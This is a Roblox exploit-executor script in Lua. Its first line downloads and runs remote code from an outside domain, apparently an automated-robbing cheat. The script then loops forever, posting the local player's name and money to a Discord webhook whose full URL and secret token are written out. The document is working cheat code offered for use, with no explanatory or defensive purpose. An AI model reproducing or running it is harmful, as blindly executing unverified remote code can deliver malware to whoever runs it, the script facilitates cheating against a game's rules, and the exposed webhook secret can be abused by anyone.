loadstring(game:HttpGet('http://scripts.projectauto.xyz/AutoRobV4'))()
local webhookUrl = "https://discord.com/api/webhooks/1336346308956524564/QgLSBGajjPB2OEONqdxMKVLcOzZAQoqjAWe0zivi-5TLXbt4Zw5PBN27--6JThdviZ2U" 
local http_request = http_request or request or HttpPost or syn.request

local function sendToWebhook(player)
    local leaderstats = player:FindFirstChild("leaderstats")
    if not leaderstats then return end
    
    local money = leaderstats:FindFirstChild("Money")
    if not money then return end

    local data = {
        content = string.format("User: %s | Money: %d", player.Name, money.Value)
    }

    local headers = {
        ["Content-Type"] = "application/json"
    }

    local webhookUrl = webhookUrl
    if not webhookUrl or webhookUrl == "" then
        print("webhookUrl is not set.")
        return
    end

    local success, response = pcall(function()
        return http_request({
            Url = webhookUrl,
            Method = "POST",
            Headers = headers,
            Body = game:GetService("HttpService"):JSONEncode(data)
        })
    end)

    if success then
        print("Message sent to Discord webhook!")
    else
        print("Failed to send message to Discord webhook. Error: " .. response)
    end
end

while true do
    sendToWebhook(game:GetService("Players").LocalPlayer)
    task.wait(25)
end
